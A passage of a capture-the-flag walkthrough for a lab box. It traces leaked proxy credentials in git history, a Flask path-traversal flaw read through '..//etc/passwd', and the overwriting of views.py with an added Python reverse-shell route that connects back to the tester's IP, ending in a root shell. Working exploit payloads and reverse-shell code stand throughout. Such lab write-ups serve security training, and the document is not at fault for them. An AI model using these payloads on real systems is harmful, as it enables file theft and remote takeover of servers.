</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git show HEAD~1 <span style="color:#75715e"># to show the changes made on the commit before the last one and `HEAD~n` to show the n commit before the last one </span>
</span></span><span style="display:flex;"><span>commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:54 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    added gitignore
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>diff --git a/.gitignore b/.gitignore
</span></span><span style="display:flex;"><span>new file mode <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span>index 0000000..e50a290
</span></span><span style="display:flex;"><span>--- /dev/null
</span></span><span style="display:flex;"><span>+++ b/.gitignore
</span></span><span style="display:flex;"><span>@@ -0,0 +1,26 @@
</span></span><span style="display:flex;"><span>+.DS_Store
</span></span><span style="display:flex;"><span>+.env
</span></span><span style="display:flex;"><span>+.flaskenv
</span></span><span style="display:flex;"><span>+*.pyc
</span></span><span style="display:flex;"><span>+*.pyo
</span></span><span style="display:flex;"><span>+env/
</span></span><span style="display:flex;"><span>+venv/
</span></span><span style="display:flex;"><span>+.venv/
</span></span><span style="display:flex;"><span>+env*
</span></span><span style="display:flex;"><span>+dist/
</span></span><span style="display:flex;"><span>+build/
</span></span><span style="display:flex;"><span>+*.egg
</span></span><span style="display:flex;"><span>+*.egg-info/
</span></span><span style="display:flex;"><span>+_mailinglist
</span></span><span style="display:flex;"><span>+.tox/
</span></span><span style="display:flex;"><span>+.cache/
</span></span><span style="display:flex;"><span>+.pytest_cache/
</span></span><span style="display:flex;"><span>+.idea/
</span></span><span style="display:flex;"><span>+docs/_build/
</span></span><span style="display:flex;"><span>+.vscode
</span></span><span style="display:flex;"><span>+
</span></span><span style="display:flex;"><span>+# Coverage reports
</span></span><span style="display:flex;"><span>+htmlcov/
</span></span><span style="display:flex;"><span>+.coverage
</span></span><span style="display:flex;"><span>+.coverage.*
</span></span><span style="display:flex;"><span>+*,cover
</span></span><span style="display:flex;"><span>diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
</span></span><span style="display:flex;"><span>deleted file mode <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span>index 5975e3f..0000000
</span></span><span style="display:flex;"><span>--- a/app/.vscode/settings.json
</span></span><span style="display:flex;"><span>+++ /dev/null
</span></span><span style="display:flex;"><span>@@ -1,5 +0,0 @@
</span></span><span style="display:flex;"><span>-<span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;python.pythonPath&#34;</span>: <span style="color:#e6db74">&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span>,
</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxy&#34;</span>: <span style="color:#e6db74">&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span>,
</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxyStrictSSL&#34;</span>: false
</span></span><span style="display:flex;"><span>-<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>I can see some credentials <em>dev01:Soulless_Developer#2022</em> that were stored before and then removed in this commit, but when I tried to <em>SSH</em> using them it failed, however they might be useful later on.</p>
<h2 id="spotting-a-vulnerability">Spotting A Vulnerability</h2>
<p>After cycling through the files, <em>app/app/view.py</em> caugth my interest.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>views<span style="color:#f92672">.</span>py 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
</span></span></code></pre></div><p>Specifically the <em>get_file_name</em> function which is called from <em>upload_file</em> and <em>send_report</em> functions. If this function is vulnerable and doesn&rsquo;t escape the user input correctly, and if this is the code that the current application runs, then I might be able to exploit it and <em>read</em> or <em>write</em> arbitrary files.</p>
<p>So let&rsquo;s see how this function handles input:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>utils<span style="color:#f92672">.</span>py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">current_milli_time</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> round(time<span style="color:#f92672">.</span>time() <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Pass filename and return a secure version, which can then safely be stored on a regular file system.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_file_name</span>(unsafe_filename):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(unsafe_filename, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TODO: get unique filename
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_unique_upload_name</span>(unsafe_filename):
</span></span><span style="display:flex;"><span>    spl <span style="color:#f92672">=</span> unsafe_filename<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">.&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    file_name <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(file_name, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> str(current_milli_time()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> file_extension
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Recursively replace a pattern in a string
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recursive_replace</span>(search, replace_me, with_me):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> replace_me <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> search:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> search
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(search<span style="color:#f92672">.</span>replace(replace_me, with_me), replace_me, with_me)
</span></span></code></pre></div><p>It appears that there are 2 functions, <em>get_file_name</em> (unsafe) and <em>get_unique_upload_name</em> (considered by the developer safe) but is not yet implemented. This code here uses the unsafe <em>get_file_name</em> that calls <em>recursive_replace</em> function which replaces <em>../</em> string with nothing, and since it is recusivly doing that, there is no way to get arround it.</p>
<p>However in the <em>app/app/views.py</em> this function is called, then its output is passed to the <em>os.path.join</em> function, then to the <em>send_file</em> function from 

<a href="https://github.com/pallets/flask" target="_blank"><em>Flask</em></a> which will return the content of the file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>views<span style="color:#f92672">.</span>py 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
</span></span></code></pre></div><p>From the first look this code appears to be secure, however the use of <em>os.path.join</em> ruined everything, because if this function takes parameters like <em>(&quot;/var/www/html&quot;, &ldquo;app&rdquo;, &ldquo;/etc/passwd&rdquo;)</em> and tries to return the path of that, instead of returning something like <em>&quot;/var/www/html/app/etc/passwd&quot;</em>, it will return <em>&quot;/etc/passwd&quot;</em> due to the <em>/</em> at the begining of the last string.</p>
<h3 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h3>
<p>Now let&rsquo;s try to see if this vulnerability exists in the production code.</p>
<p>For this I will try to upload a file first and then access it to make sure that everything is normal and the application is taking my file and storing it somewhere.</p>
<p><img src="trying-to-upload-normal-file.png" alt="Uploading Normal file"></p>
<p>Looks like this application is not using a function like <em>get_unique_upload_name</em> because the name of the uploaded file is the same.</p>
<p>Now I will try the <em>Local File Inclusion</em> payload using 

<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a>:</p>
<p><code>uploads//etc/passwd</code></p>
<p><img src="Initial-LFI-try.png" alt="LFI Initial Try"></p>
<p>Looks like I got redirected. After playing a little bit with 

<a href="https://github.com/pallets/flask" target="_blank"><em>Flask</em></a> localy, I noticed that this is a nomral behavior in it, if the url path contained something like <em>uploads//something/here</em> it will redirect it to <em>uploads/something/here</em> then will process this new request.</p>
<p>To avoid this, I can make use fo the <em>get_file_name</em> being called to check for <em>../</em> string and remove it:</p>
<ul>
<li>First, I will request the path <em>uploads/..//etc/passwd</em></li>
<li>

<a href="https://github.com/pallets/flask" target="_blank"><em>Flask</em></a> will not redirect this request because the path is not <em>uploads//</em></li>
<li>Then it will call the <em>get_file_name</em> function on <em>..//etc/passwd</em> which will remove <em>../</em> and return <em>/etc/passwd</em></li>
<li>Finally <em>/etc/passwd</em> string will pass to the <em>os.path.join</em> function as parameter and will result in <em>/etc/passwd</em> being the file read</li>
</ul>
<p><img src="reading-files-with-LFI.png" alt="Reading Files with LFI"></p>
<p>I can now <em>read</em> files using this payload, however the <em>upload_file</em> function also uses the same process, which means that I can override files by passing <em>..//[path][file to override]</em> as filename.</p>
<h3 id="overriting-files-to-get-a-reverse-shell">Overriting Files to Get a Reverse Shell</h3>
<p>One possible way to get a reverse shell is to override the <em>views.py</em> file and append to it a new route that will execute our malicious code when accessed.</p>
<p>But first, I need to know where this file exists. I can do that by trying to intentionnally raise an error in the application, to see if I can get any sort of verbose error logging telling me what went wrong.</p>
<p><img src="Indentifying-where-the-application-exists.png" alt="Finding Where The Application Is"></p>
<p>Now I know that the application is inside the <em>/app/</em> directory and has the same upload hierarchy as the one I just unziped, meaning that I can guess that the <em>views.py</em> will be at <em>/app/app/views.py</em></p>
<p><img src="Reading-views-using-LFI.png" alt="Reading Views.py using LFI"></p>
<p>This code looks very similar to the one I saw before, so what I&rsquo;ll do is copy this file and append to it my malicious code then upload a new file with the name of <em>..//app/app/views.py</em> which will override the current <em>views.py</em> with my own malicious one.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat malicious<span style="color:#f92672">-</span>views<span style="color:#f92672">.</span>py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># my own imports for the reverse shell to work</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
</span></span><span style="display:flex;"><span><span style="color:#75715e">#############</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/download&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;app&#34;</span>, <span style="color:#e6db74">&#34;static&#34;</span>, <span style="color:#e6db74">&#34;source.zip&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/upcloud&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># my own malicious route to get a reverse shell</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/revShell/&lt;ip&gt;/&lt;port&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect_back</span>(ip<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, port<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((str(ip),int(port)))
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
</span></span></code></pre></div><ul>
<li>Code for reverse shell taken from 

<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python" target="_blank">PayloadsAllTheThings</a></li>
</ul>
<p>I&rsquo;ll intercept the upload file request using 

<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a> and change the filename:</p>
<p><img src="overriding-views-file.png" alt="Overwriting views.py with malicious code"></p>
<p>Now let&rsquo;s get a reverse shell by navigating the to newly created view, <em>

<a href="http://opensource.htb/revShell/10.10.16.59/8989" target="_blank">http://opensource.htb/revShell/10.10.16.59/8989</a></em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8989</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.164<span style="color:#f92672">]</span> <span style="color:#ae81ff">52332</span>
</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># id        </span>
</span></span><span style="display:flex;"><span>    id
</span></span><span style="display:flex;"><span>    uid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,11<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>dialout<span style="color:#f92672">)</span>,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># ip addr </span>
</span></span><span style="display:flex;"><span>    ip addr
</span></span><span style="display:flex;"><span>    1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style="display:flex;"><span>        inet 127.0.0.1/8 scope host lo
</span></span><span style="display:flex;"><span>        valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>    20: eth0@if21: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP 
</span></span><span style="display:flex;"><span>        link/ether 02:42:ac:11:00:05 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>        inet 172.17.0.5/16 brd 172.17.255.255 scope global eth0
</span></span><span style="display:flex;"><span>        valid_lft forever preferred_lft forever
</span></span></code></pre></div><ul>
<li>
<p>You might get some weird characters at the begining of the prompt like <em>/app # ^[[24;8R</em> which is ok, you can avoid this by getting a fully interactive shell, via backgrounding the shell using <em>CTRL+z</em> then issuing the command <code>stty raw -echo;fg</code> and pressing enter.</p>
</li>
<li>
<p>This is a simple python3 script I wrote to upload the file automatically and get a reverse shell, I just need to listen on my specified port before executing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat upload_malicious<span style="color:#f92672">.</span>py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Provide your listening IP followed by the Port as argument&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;malicious-views.py&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
